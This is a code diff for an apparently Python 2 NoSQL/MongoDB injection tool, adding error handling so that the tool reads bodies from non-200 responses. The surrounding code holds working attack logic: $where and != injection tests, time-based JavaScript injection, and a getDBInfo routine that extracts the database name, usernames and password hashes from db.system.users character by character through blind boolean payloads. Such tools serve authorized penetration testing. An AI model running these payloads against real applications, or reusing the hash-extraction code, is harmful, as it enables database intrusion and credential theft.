@@ -58,7 +58,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
         req = urllib2.Request(appURL, None, requestHeaders)
         appRespCode = urllib2.urlopen(req).getcode()
         if appRespCode == 200:
-            normLength = int(len(urllib2.urlopen(req).read()))
+            normLength = int(len(getResponseBodyHandlingErrors(req)))
             timeReq = urllib2.urlopen(req)
             start = time.time()
             page = timeReq.read()
@@ -86,7 +86,6 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
         print "Using " + injectString + " for injection testing.\n"
 
         # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
-        # Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
         if "?" not in appURL:
             print "No URI parameters provided for GET request...Check your options.\n"
             raw_input("Press enter to continue...")
@@ -101,7 +100,9 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
         else:
             print "Sending random parameter value..."
 
-        randLength = int(len(urllib2.urlopen(req).read()))
+        responseBody = getResponseBodyHandlingErrors(req)
+        randLength = int(len(responseBody))
+
         print "Got response length of " + str(randLength) + "."
         randNormDelta = abs(normLength - randLength)
 
@@ -117,10 +118,10 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
 
         # Test for errors returned by injection
         req = urllib2.Request(uriArray[1], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -135,11 +136,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
 
         print uriArray[2]
         req = urllib2.Request(uriArray[2], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
 
@@ -154,11 +155,11 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Test 3:  $where injection (integer escape)"
 
         req = urllib2.Request(uriArray[3], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum +=1
 
@@ -174,10 +175,10 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Test 4: $where injection string escape (single record)"
 
         req = urllib2.Request(uriArray[4], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -191,10 +192,10 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Test 5: $where injection integer escape (single record)"
 
         req = urllib2.Request(uriArray[5], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum +=1
 
@@ -209,10 +210,10 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Test 6: This != injection (string escape)"
 
         req = urllib2.Request(uriArray[6], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -226,10 +227,10 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Test 7: This != injection (integer escape)"
 
         req = urllib2.Request(uriArray[7], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
         else:
@@ -244,10 +245,10 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Test 8: PHP/ExpressJS > Undefined Injection"
 
         req = urllib2.Request(uriArray[8], None, requestHeaders)
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,None)
             testNum += 1
 
@@ -258,10 +259,8 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Starting Javascript string escape time based injection..."
             req = urllib2.Request(uriArray[18], None, requestHeaders)
             start = time.time()
-            strTimeInj = urllib2.urlopen(req)
-            page = strTimeInj.read()
+            page = getResponseBodyHandlingErrors(req)
             end = time.time()
-            strTimeInj.close()
             #print str(end)
             #print str(start)
             strTimeDelta = (int(round((end - start), 3)) - timeBase)
@@ -277,10 +276,8 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
             print "Starting Javascript integer escape time based injection..."
             req = urllib2.Request(uriArray[9], None, requestHeaders)
             start = time.time()
-            intTimeInj = urllib2.urlopen(req)
-            page = intTimeInj.read()
+            page = getResponseBodyHandlingErrors(req)
             end = time.time()
-            intTimeInj.close()
             #print str(end)
             #print str(start)
             intTimeDelta = (int(round((end - start), 3)) - timeBase)
@@ -348,6 +345,15 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
     return()
 
 
+def getResponseBodyHandlingErrors(req):
+    try:
+        responseBody = urllib2.urlopen(req).read()
+    except urllib2.HTTPError, err:
+        responseBody = err.read()
+    
+    return responseBody
+
+
 def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
     print "Web App Attacks (POST)"
     print "==============="
@@ -386,7 +392,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
 
         if appRespCode == 200:
 
-            normLength = int(len(urllib2.urlopen(req).read()))
+            normLength = int(len(getResponseBodyHandlingErrors(req)))
             timeReq = urllib2.urlopen(req)
             start = time.time()
             page = timeReq.read()
@@ -438,7 +444,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
 
         body = urllib.urlencode(postData)
         req = urllib2.Request(appURL,body, requestHeaders)
-        randLength = int(len(urllib2.urlopen(req).read()))
+        randLength = int(len(getResponseBodyHandlingErrors(req)))
         print "Got response length of " + str(randLength) + "."
 
         randNormDelta = abs(normLength - randLength)
@@ -460,10 +466,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 1: PHP/ExpressJS != associative array injection"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -487,10 +493,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 2:  PHP/ExpressJS > Undefined Injection"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -504,10 +510,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 3: $where injection (string escape)"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
         else:
@@ -524,10 +530,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 4: $where injection (integer escape)"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
         else:
@@ -545,10 +551,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 5: $where injection string escape (single record)"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -566,10 +572,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 6: $where injection integer escape (single record)"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -588,10 +594,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 7: This != injection (string escape)"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
             print "\n"
@@ -608,10 +614,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Test 8:  This != injection (integer escape)"
 
-        errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
 
         if errorCheck == False:
-            injLen = int(len(urllib2.urlopen(req).read()))
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
             checkResult(randLength,injLen,testNum,verb,postData)
             testNum += 1
 
@@ -974,7 +980,7 @@ def getDBInfo():
     trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
     #print "Debug " + str(trueUri)
     req = urllib2.Request(trueUri, None, requestHeaders)
-    baseLen = int(len(urllib2.urlopen(req).read()))
+    baseLen = int(len(getResponseBodyHandlingErrors(req)))
     print "Got baseline true query length of " + str(baseLen)
 
     print "Calculating DB name length..."
@@ -983,7 +989,7 @@ def getDBInfo():
         calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} var dum='a" + "&")
         #print "Debug: " + calcUri
         req = urllib2.Request(calcUri, None, requestHeaders)
-        lenUri = int(len(urllib2.urlopen(req).read()))
+        lenUri = int(len(getResponseBodyHandlingErrors(req)))
         #print "Debug length: " + str(lenUri)
 
         if lenUri == baseLen:
@@ -998,7 +1004,7 @@ def getDBInfo():
         charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")
 
         req = urllib2.Request(charUri, None, requestHeaders)
-        lenUri = int(len(urllib2.urlopen(req).read()))
+        lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
         if lenUri == baseLen:
             dbName = dbName + chars[charCounter]
@@ -1024,7 +1030,7 @@ def getDBInfo():
             usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
 
             req = urllib2.Request(usrCntUri, None, requestHeaders)
-            lenUri = int(len(urllib2.urlopen(req).read()))
+            lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
             if lenUri == baseLen:
                 print "Found " + str(usrCount) + " user(s)."
@@ -1050,7 +1056,7 @@ def getDBInfo():
                     usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
 
                     req = urllib2.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(urllib2.urlopen(req).read()))
+                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         # Got the right number of characters
@@ -1063,7 +1069,7 @@ def getDBInfo():
                     usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
 
                     req = urllib2.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(urllib2.urlopen(req).read()))
+                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         username = username + chars[charCounterUsr]
@@ -1088,7 +1094,7 @@ def getDBInfo():
                     hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
 
                     req = urllib2.Request(hashUri, None, requestHeaders)
-                    lenUri = int(len(urllib2.urlopen(req).read()))
+                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         pwdHash = pwdHash + chars[charCounterHash]
@@ -1111,7 +1117,7 @@ def getDBInfo():
                     usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
 
                     req = urllib2.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(urllib2.urlopen(req).read()))
+                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         # Got the right number of characters
@@ -1124,7 +1130,7 @@ def getDBInfo():
                     usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
 
                     req = urllib2.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(urllib2.urlopen(req).read()))
+                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         username = username + chars[charCounterUsr]
@@ -1146,7 +1152,7 @@ def getDBInfo():
                     hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
 
                     req = urllib2.Request(hashUri, None, requestHeaders)
-                    lenUri = int(len(urllib2.urlopen(req).read()))
+                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         pwdHash = pwdHash + chars[charCounterHash]
